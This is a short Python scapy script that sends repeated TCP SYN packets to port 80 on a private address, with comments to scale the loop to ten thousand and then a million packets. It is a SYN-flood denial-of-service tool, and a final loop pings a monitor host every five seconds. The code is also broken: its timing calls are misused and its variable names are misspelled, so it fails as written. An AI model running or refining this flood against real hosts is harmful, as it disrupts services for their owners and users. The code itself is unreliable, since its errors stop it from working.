from scapy.all import *
from time import time

# define target IP and port
target_ip = "192.168.1.100"
target_port = 80

# create SYN packet
syn_pkt = IP(dst=target_ip)/TCP(sport=RandShort(), dport=target_port, flags="S")

# send packets in loop, %% change j to 10K
with open("syns_results_p.txt", "w") as f:
    start_total = time.time()
    for i in range(100):
        for j in range(10):
            start = time.time()
            send(syn_pkt, verbose=0)
            end = time.time()
            f.write(f"{i}\t{end - start}\n")
    
    end_toal = time.time
    toatal_time = end_toal - start_total
    avg_time = toatal_time / 1000 #%%change to 1m
    f.write(f"Total time: {total_time}\nAverage time per packet: {avg_time}")
    f.close()

# send one ping every 5 seconds to monitor server
monitor_ip = "192.168.1.200"
while True:
    send(IP(dst=monitor_ip)/ICMP(), verbose=0)
    time.sleep(5)
